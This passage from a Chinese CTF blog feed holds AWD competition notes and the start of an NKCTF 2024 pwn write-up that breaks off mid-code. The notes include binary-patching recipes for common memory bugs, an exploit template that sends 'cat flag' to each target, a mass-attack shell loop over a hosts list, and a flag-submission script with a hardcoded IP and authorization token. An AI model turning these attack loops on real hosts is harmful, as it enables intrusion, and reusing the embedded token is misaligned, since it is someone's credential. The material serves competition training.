comment">#*</span>NUM_THREADS <span class="token operator">=</span> <span class="token number">256</span>threads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>check_ip<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    threads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>thread<span class="token punctuation">)</span>    thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>threads<span class="token punctuation">)</span> <span class="token operator">>=</span> NUM_THREADS<span class="token punctuation">:</span>        <span class="token keyword">for</span> t <span class="token keyword">in</span> threads<span class="token punctuation">:</span>            t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>        threads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> t <span class="token keyword">in</span> threads<span class="token punctuation">:</span>    t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ul><li><p>工具</p><ul><li><p><code>IDA</code></p></li><li><p>加沙箱：<a href="https://github.com/TTY-flag/evilPatcher#/">https://github.com/TTY-flag/evilPatcher#/</a></p></li><li><p><a href="https://github.com/aftern00n/AwdPwnPatcher#/">https://github.com/aftern00n/AwdPwnPatcher#/</a></p></li></ul></li><li><p>使用</p><ul><li><p>加沙箱通防</p><ul><li><code>sandboxs</code>里改禁用规则</li><li><code>python3 evil_patcher.py file_name sandboxfile</code></li></ul></li><li><p><code>IDA</code>的<code>patch</code>步骤：<code>Edit -&gt; Patch program -&gt; Apply patches to input file</code></p></li><li><p><code>AWDPwnPatcher</code>使用</p><ul><li><code>from AwdPwnPatcher import *binary = &quot;filename&quot;awd_pwn_patcher = AwdPwnPatcher(binary)</code></li><li><code>add_patch_in_ehframe(assembly=&quot;&quot;, machine_code=[])</code></li><li><code>patch_origin(start, end=0, assembly=&quot;&quot;, machine_code=[], string=&quot;&quot;)</code></li><li><code>patch_by_jmp(self, jmp_from, jmp_to=0, assembly=&quot;&quot;, machine_code=[])</code></li><li><code>patch_by_call(self, call_from, assembly=&quot;&quot;, machine_code=[])</code></li><li><code>add_constant_in_ehframe(self, string)</code></li><li><code>save(self, save_path=&quot;&quot;)</code></li></ul></li><li><p>格式化字符串漏洞</p><ul><li><p><code>32</code>位</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> AwdPwnPatcher <span class="token keyword">import</span> <span class="token operator">*</span>binary <span class="token operator">=</span> <span class="token string">"filename"</span>awd_pwn_patcher <span class="token operator">=</span> AwdPwnPatcher<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>awd_pwn_patcher<span class="token punctuation">.</span>patch_fmt_by_call<span class="token punctuation">(</span>address<span class="token punctuation">)</span>  <span class="token comment">#call printf地址</span>awd_pwn_patcher<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>64</code>位</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> AwdPwnPatcher <span class="token keyword">import</span> <span class="token operator">*</span>binary <span class="token operator">=</span> <span class="token string">"filename"</span>awd_pwn_patcher <span class="token operator">=</span> AwdPwnPatcher<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>fmt_offset <span class="token operator">=</span> awd_pwn_patcher<span class="token punctuation">.</span>add_constant_in_ehframe<span class="token punctuation">(</span><span class="token string">"%s\\x00\\x00"</span><span class="token punctuation">)</span>  <span class="token comment">#添加%s</span>assembly <span class="token operator">=</span> <span class="token triple-quoted-string string">"""mov rsi, qword ptr [rbp-0x8]lea rdi, qword ptr [&#123;&#125;]"""</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>fmt_offset<span class="token punctuation">)</span><span class="token punctuation">)</span>awd_pwn_patcher<span class="token punctuation">.</span>patch_by_jmp<span class="token punctuation">(</span><span class="token number">0x706</span><span class="token punctuation">,</span> jmp_to<span class="token operator">=</span><span class="token number">0x712</span><span class="token punctuation">,</span> assembly<span class="token operator">=</span>assembly<span class="token punctuation">)</span>    <span class="token comment">#改printf，mov rax地址和call printf地址</span>awd_pwn_patcher<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>栈溢出</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> AwdPwnPatcher <span class="token keyword">import</span> <span class="token operator">*</span>binary <span class="token operator">=</span> <span class="token string">"filename"</span>awd_pwn_patcher <span class="token operator">=</span> AwdPwnPatcher<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>assembly <span class="token operator">=</span> <span class="token triple-quoted-string string">'''push 0x20   #缩小输入范围，控制寄存器push进去的值'''</span>awd_pwn_patcher<span class="token punctuation">.</span>patch_origin<span class="token punctuation">(</span><span class="token number">0x8048476</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token number">0x804847b</span><span class="token punctuation">,</span> assembly<span class="token operator">=</span>assembly<span class="token punctuation">)</span>   <span class="token comment">#原push地址和push的下一条地址</span>awd_pwn_patcher<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>UAF</code></p><ul><li><p><code>32</code>位</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> AwdPwnPatcher <span class="token keyword">import</span> <span class="token operator">*</span>binary <span class="token operator">=</span> <span class="token string">"./filename"</span>awd_pwn_patcher <span class="token operator">=</span> AwdPwnPatcher<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>assembly <span class="token operator">=</span> <span class="token triple-quoted-string string">"""add esp, 0x10mov eax, 0mov edx, dword ptr [ebp - 0x20]mov eax, 0x804a060  #被释放的地址lea eax, dword ptr [eax + edx*4]mov dword ptr [eax], 0"""</span>awd_pwn_patcher<span class="token punctuation">.</span>patch_by_jmp<span class="token punctuation">(</span><span class="token number">0x80485bf</span><span class="token punctuation">,</span> jmp_to<span class="token operator">=</span><span class="token number">0x80485c7</span><span class="token punctuation">,</span> assembly<span class="token operator">=</span>assembly<span class="token punctuation">)</span>    <span class="token comment">#call free地址和下一条地址</span>awd_pwn_patcher<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>64</code>位</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> AwdPwnPatcher <span class="token keyword">import</span> <span class="token operator">*</span>binary <span class="token operator">=</span> <span class="token string">"./filename"</span>awd_pwn_patcher <span class="token operator">=</span> AwdPwnPatcher<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>assembly <span class="token operator">=</span> <span class="token triple-quoted-string string">"""mov eax, 0mov eax, dword ptr [rbp - 0x1c]cdqelea rdx, qword ptr [0x201040]lea rax, qword ptr [rdx + rax*8]mov qword ptr [rax], 0"""</span>awd_pwn_patcher<span class="token punctuation">.</span>patch_by_jmp<span class="token punctuation">(</span><span class="token number">0x838</span><span class="token punctuation">,</span> jmp_to<span class="token operator">=</span><span class="token number">0x83d</span><span class="token punctuation">,</span> assembly<span class="token operator">=</span>assembly<span class="token punctuation">)</span>awd_pwn_patcher<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p><code>gets</code> 栈溢出</p><p>只有<code>gets</code>函数能够接受用户输入时，将流程劫持到<code>.eh_frame</code>段，利用<code>syscall</code>构造<code>read</code>函数，就能控制输入数据的长度。</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.eh_frame:0000000000400F7D mov     rax, 0          ;#define __NR_read 0.eh_frame:0000000000400F84 mov     rdi, 0          ; fd.eh_frame:0000000000400F8B lea     rsi, [rbp+buf]  ; buf.eh_frame:0000000000400F8E mov     rdx, 90h        ; count.eh_frame:0000000000400F95 syscall.eh_frame:0000000000400F97 jmp     loc_400AB4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>负数绕过：输入负数<code>-1</code>也满足<code>jle</code>，修复方法：将<code>JLE</code>改为<code>JBE</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">cmp     eax, 20hjle     short loc_8048777<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></li></ul><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># A script for awd exp</span><span class="token keyword">import</span> os<span class="token keyword">import</span> sys<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">write_to_flags</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">:</span>    fd <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./flags'</span><span class="token punctuation">,</span> <span class="token string">'ab'</span><span class="token punctuation">)</span>    fd<span class="token punctuation">.</span>write<span class="token punctuation">(</span>d <span class="token operator">+</span> <span class="token string">b'\n'</span><span class="token punctuation">)</span>    fd<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>ip <span class="token operator">=</span> server_ip <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>port <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">#exp</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'cat flag'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'&#123;'</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">b'viol1t&#123;'</span> <span class="token operator">+</span> r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'&#125;'</span><span class="token punctuation">)</span>write_to_flags<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="submit-flag-py"><a href="#submit-flag-py" class="headerlink" title="submit_flag.py"></a>submit_flag.py</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># A script for awd loop submit flag</span><span class="token keyword">import</span> threading<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep<span class="token keyword">import</span> os<span class="token keyword">import</span> json<span class="token keyword">import</span> requestsflag_file <span class="token operator">=</span> <span class="token string">'./flags'</span>threads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">submit</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment"># url = 'https://ctf.bugku.com/awd/submit.html?token=88b02ce3b420ec1f4b4a2e02dd6fe305&amp;flag=' + flag[:-1]</span>        url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"curl -X POST http://27.25.152.77:19999/api/flag -H 'Authorization: 7f120ca9b0e3024d06734a04a986cc55' -d '&#123;&#123; \"flag\": \"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">-1]</span><span class="token punctuation">&#125;</span></span><span class="token string">\"&#125;&#125;'"</span></span>        <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token comment"># r = requests.get(url)</span>        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m[+] pwned!\x1b[0m'</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m[-] connect fail: &#123;&#125;\x1b[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>flag_file<span class="token punctuation">)</span> <span class="token keyword">as</span> flag_txt<span class="token punctuation">:</span>        flags <span class="token operator">=</span> flag_txt<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> flag <span class="token keyword">in</span> flags<span class="token punctuation">:</span>            thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>submit<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            threads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>thread<span class="token punctuation">)</span>            thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> thread <span class="token keyword">in</span> threads<span class="token punctuation">:</span>            thread<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="attack-sh"><a href="#attack-sh" class="headerlink" title="attack.sh"></a>attack.sh</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#! /bin/bash</span><span class="token assign-left variable">attack_times</span><span class="token operator">=</span><span class="token number">10000</span><span class="token assign-left variable">round_wait_time</span><span class="token operator">=</span><span class="token number">30</span> <span class="token comment">#half time</span><span class="token assign-left variable">wait_submit_time</span><span class="token operator">=</span><span class="token number">5</span><span class="token assign-left variable">log_file</span><span class="token operator">=</span><span class="token string">"logs"</span><span class="token assign-left variable">run_time</span><span class="token operator">=</span><span class="token number">120</span> <span class="token comment">#timeout</span><span class="token assign-left variable">next_attack_time</span><span class="token operator">=</span><span class="token number">2.5</span> <span class="token assign-left variable">max_concurrent_attacks</span><span class="token operator">=</span><span class="token number">10</span> <span class="token comment"># Max number of concurrent attacks</span><span class="token function-name function">log</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token assign-left variable">t</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">date</span> <span class="token string">"+%H:%M:%S"</span><span class="token variable">)</span></span>    <span class="token assign-left variable">m</span><span class="token operator">=</span><span class="token string">"[<span class="token variable">$t</span>]<span class="token variable">$1</span>"</span> <span class="token comment"># Fixed missing parameter usage</span>    <span class="token assign-left variable">info</span><span class="token operator">=</span><span class="token string">"<span class="token entity" title="\033">\033</span>[43;37m <span class="token variable">$m</span> <span class="token entity" title="\033">\033</span>[0m"</span>    <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token variable">$info</span>"</span>    <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token variable">$m</span>"</span> <span class="token operator">>></span> <span class="token variable">$log_file</span><span class="token punctuation">&#125;</span><span class="token function-name function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token builtin class-name">echo</span> <span class="token string">"-- round <span class="token variable">$1</span> -- "</span> <span class="token operator">>></span> all_flags    <span class="token function">cat</span> flags <span class="token operator">>></span> all_flags    <span class="token function">rm</span> flags    <span class="token builtin class-name">local</span> <span class="token assign-left variable">jobs</span><span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">for</span> <span class="token for-or-select variable">line</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> hosts<span class="token variable">)</span></span><span class="token punctuation">;</span> <span class="token keyword">do</span>        <span class="token function">timeout</span> <span class="token parameter variable">--foreground</span> <span class="token variable">$run_time</span> python3 ./exp.py <span class="token string">"<span class="token variable">$line</span>"</span> <span class="token operator">&amp;</span>        <span class="token function">sleep</span> <span class="token variable">$next_attack_time</span>        <span class="token variable"><span class="token punctuation">((</span>jobs<span class="token operator">++</span><span class="token punctuation">))</span></span>        <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$jobs</span>"</span> <span class="token parameter variable">-ge</span> <span class="token string">"<span class="token variable">$max_concurrent_attacks</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>            <span class="token function">wait</span> <span class="token comment"># Wait for all background jobs to finish</span>            <span class="token assign-left variable">jobs</span><span class="token operator">=</span><span class="token number">0</span>        <span class="token keyword">fi</span>    <span class="token keyword">done</span>    <span class="token function">wait</span> <span class="token comment"># Ensure all attacks are complete before moving on</span>    <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\x1b">\x1b</span>[47;30m Waiting <span class="token variable">$wait_submit_time</span> s to submit flag<span class="token entity" title="\x1b">\x1b</span>[0m"</span>    <span class="token function">sleep</span> <span class="token variable">$wait_submit_time</span>    <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\x1b">\x1b</span>[47;30m Submitting flag<span class="token entity" title="\x1b">\x1b</span>[0m"</span>    python3 ./submit_flag.py<span class="token punctuation">&#125;</span><span class="token keyword">for</span> <span class="token variable"><span class="token punctuation">((</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> attack_times<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">))</span></span><span class="token punctuation">;</span> <span class="token keyword">do</span>    <span class="token assign-left variable">m</span><span class="token operator">=</span><span class="token string">"-------- round <span class="token variable">$i</span> --------"</span>    log <span class="token string">"<span class="token variable">$m</span>"</span>    attack <span class="token variable">$i</span>    <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\x1b">\x1b</span>[47;30m Waiting next round<span class="token entity" title="\x1b">\x1b</span>[0m"</span>    <span class="token function">sleep</span> <span class="token variable">$round_wait_time</span><span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="流量监控"><a href="#流量监控" class="headerlink" title="流量监控"></a>流量监控</h2><h3 id="pwn-waf"><a href="#pwn-waf" class="headerlink" title="pwn_waf"></a>pwn_waf</h3><p><a href="https://github.com/i0gan/pwn_waf/tree/main">https://github.com/i0gan/pwn_waf/tree/main</a></p><p>创建一个文件夹并赋一定权限，改<code>makefile</code>中的<code>log path</code>为该文件夹地址，<code>make</code>后将<code>pwn</code>和<code>catch</code>放到创建的文件夹中，再用<code>catch</code>替换<code>pwn</code>文件，此时<code>exp</code>打用<code>catch</code>替换的<code>pwn</code>文件即可在创建的文件夹中接收到流量</p><h2 id="总结流程"><a href="#总结流程" class="headerlink" title="总结流程"></a>总结流程</h2><ul><li>改<code>init_hosts.py</code>中的<code>ip</code>格式和<code>port</code></li><li>改<code>submit_flag.py</code>中的提交方式和<code>token</code></li><li>改<code>round_wait_time</code></li><li><code>patch</code></li><li>写<code>exp</code></li><li>批量攻击</li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> awd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024NKCTF-maimai查分器</title>
      <link href="/2024/03/26/2024nkctf-maimai-cha-fen-qi/2024nkctf-maimai-cha-fen-qi/"/>
      <url>/2024/03/26/2024nkctf-maimai-cha-fen-qi/2024nkctf-maimai-cha-fen-qi/</url>
      
        <content type="html"><![CDATA[<p>格式化字符串+栈溢出+沙箱</p><p>保护全开</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$checksec</span> pwn<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/starrysky/game_2024/nkctf/maimai/pwn'</span>    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>沙箱禁用了<code>open</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$seccomp</span>-tools dump ./pwn line  CODE  JT   JF      K<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> 0000: 0x20 0x00 0x00 0x00000004  A <span class="token operator">=</span> arch 0001: 0x15 0x00 0x05 0xc000003e  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> ARCH_X86_64<span class="token punctuation">)</span> goto 0007 0002: 0x20 0x00 0x00 0x00000000  A <span class="token operator">=</span> sys_number 0003: 0x35 0x00 0x01 0x40000000  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">&lt;</span> 0x40000000<span class="token punctuation">)</span> goto 0005 0004: 0x15 0x00 0x02 0xffffffff  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> 0xffffffff<span class="token punctuation">)</span> goto 0007 0005: 0x15 0x01 0x00 0x00000002  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> <span class="token function">open</span><span class="token punctuation">)</span> goto 0007 0006: 0x06 0x00 0x00 0x7fff0000  <span class="token builtin class-name">return</span> ALLOW 0007: 0x06 0x00 0x00 0x00000000  <span class="token builtin class-name">return</span> KILL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>要通过功能<code>1</code>，得到一个大于<code>0x2da2</code>的值，功能<code>1</code>中<code>50</code>次输入一个浮点数和一个字符串，每个字符串对应一个整数，最终的值是每个浮点数和字符串对应的数值的乘积的和，这个随便试试差不多就出来了</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">sub_188C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">double</span> v1<span class="token punctuation">;</span> <span class="token comment">// xmm0_8</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-28h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-24h]</span>  <span class="token keyword">double</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-20h] BYREF</span>  <span class="token keyword">double</span> v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-18h]</span>  <span class="token keyword">char</span> v7<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+23h] [rbp-Dh] BYREF</span>  <span class="token keyword">unsigned</span> __int64 v8<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-8h]</span>  v8 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> <span class="token number">0.0</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Input chart level and rank."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">49</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%lf %s"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">,</span> v7<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">==</span> <span class="token number">15.0</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      v0 <span class="token operator">=</span> v3<span class="token operator">++</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v0 <span class="token operator">==</span> <span class="token number">2</span> <span class="token 